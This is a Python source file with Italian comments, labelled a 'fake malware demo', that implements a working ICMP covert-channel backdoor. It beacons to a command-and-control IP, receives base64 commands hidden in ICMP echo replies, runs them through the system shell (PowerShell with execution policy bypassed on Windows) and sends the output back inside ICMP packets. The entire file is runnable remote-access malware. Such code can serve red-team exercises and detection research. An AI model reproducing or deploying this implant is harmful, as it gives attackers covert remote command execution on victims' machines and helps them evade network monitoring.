#!/usr/bin/env python3
"""
HAPpy - ICMP Payload (finto malware demo)
==========================================
Versione ICMP di payload_demo_b64.py.

Invece di fare polling HTTP, invia ICMP Echo Request periodici al C2 server.
  - Se la reply contiene HCMD:<b64> → esegue il comando e invia l'output
  - L'output viene inviato con un Echo Request contenente HREP:<b64>

Utilizzo:
    sudo python3 icmp_payload_demo.py <C2_IP> [--interval 5] [--iface eth0]

Requisiti:
    pip install scapy
    Eseguire con privilegi root
"""
                                                                                                                                                   
from scapy.all import IP, ICMP, Raw, send, sniff                                                                                                   
import subprocess                                                                                                                                  
import base64                                                                                                                                      
import time                                                                                                                                        
import sys                                                                                                                                         
import random
import argparse
import threading

MAGIC_CMD = b"HCMD:"
MAGIC_REP = b"HREP:"

def b64_encode(text: str) -> str:
    return base64.b64encode(text.encode("utf-8")).decode("utf-8")

def b64_decode(data: bytes) -> str:
    return base64.b64decode(data).decode("utf-8", errors="ignore")

def execute_command(command: str) -> str:
    """Esegue il comando tramite shell e ritorna l'output (cross-platform demo)."""
    import platform
    if platform.system() == "Windows":
        ps_cmd = ["powershell.exe", "-NoProfile", "-NonInteractive",
                  "-ExecutionPolicy", "Bypass", "-Command", command]
        shell_cmd = ps_cmd
        use_shell = False
    else:
        shell_cmd = command
        use_shell = True

    try:
        result = subprocess.run(
            shell_cmd,
            shell=use_shell,
            capture_output=True,
            timeout=30,
        )
        stdout = result.stdout.decode("utf-8", errors="ignore").strip()
        stderr = result.stderr.decode("utf-8", errors="ignore").strip()
        return f"{stdout}\n[stderr] {stderr}".strip() if stderr else stdout
    except subprocess.TimeoutExpired:
        return "[errore] timeout"
    except Exception as e:
        return f"[errore] {e}"


def send_result(c2_ip: str, output: str, iface):
    """Invia l'output al C2 tramite ICMP Echo Request con magic HREP."""
    encoded = b64_encode(output)
    icmp_id  = random.randint(1, 65535)
    icmp_seq = random.randint(1, 65535)

    pkt = (
        IP(dst=c2_ip) /
        ICMP(type=8, id=icmp_id, seq=icmp_seq) /
        Raw(load=MAGIC_REP + encoded.encode("utf-8"))
    )
    send(pkt, verbose=False, iface=iface)


def beacon(c2_ip: str, iface, interval: int):
    """Loop principale: invia beacon periodici e gestisce i comandi ricevuti."""
    print(f"[*] Beacon avviato → {c2_ip} (ogni {interval}s)")

    while True:
        icmp_id  = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)

        pkt = (
            IP(dst=c2_ip) /
            ICMP(type=8, id=icmp_id, seq=icmp_seq) /
            Raw(load=b"HBEACON")   # beacon senza comando
        )

        result   = {"reply": None}
        received = threading.Event()

        def is_reply(p):
            return (
                p.haslayer(IP) and p.haslayer(ICMP) and
                p[ICMP].type == 0 and
                p[ICMP].id == icmp_id and
                p.haslayer(Raw)
            )

        def capture():
            pkts = sniff(
                filter=f"icmp and src host {c2_ip}",
                lfilter=is_reply,
                count=1,
                timeout=interval - 0.5,
                iface=iface,
            )
            if pkts:
                result["reply"] = pkts[0]
            received.set()

        t = threading.Thread(target=capture, daemon=True)
        t.start()
        time.sleep(0.1)
        send(pkt, verbose=False, iface=iface)
        received.wait(timeout=interval)

        reply = result["reply"]
        if reply is None:
            print("[.] Nessuna reply")
            time.sleep(interval)
            continue

        payload = reply[Raw].load

        if payload == b"NOP" or payload == b"ACK":
            print("[.] Nessun comando in attesa")

        elif payload.startswith(MAGIC_CMD):
            encoded = payload[len(MAGIC_CMD):]
            try:
                command = b64_decode(encoded)
            except Exception:
                command = encoded.decode("utf-8", errors="ignore")

            print(f"[!] Comando ricevuto: {repr(command)}")

            if command.strip().lower() == "exit":
                print("[*] Exit ricevuto. Uscita.")
                sys.exit(0)

            output = execute_command(command)
            print(f"[>] Output:\n{output}")
            send_result(c2_ip, output, iface)

        else:
            print(f"[?] Reply sconosciuta: {repr(payload)}")

        time.sleep(interval)


def main():
    parser = argparse.ArgumentParser(description="HAPpy ICMP Payload Demo")
    parser.add_argument("c2_ip", help="IP del C2 server")
    parser.add_argument("--interval", type=int, default=5, help="Intervallo beacon in secondi (default: 5)")
    parser.add_argument("--iface", default=None, help="Interfaccia di rete (default: auto)")
    args = parser.parse_args()

    beacon(args.c2_ip, args.iface, args.interval)


if __name__ == "__main__":
    main()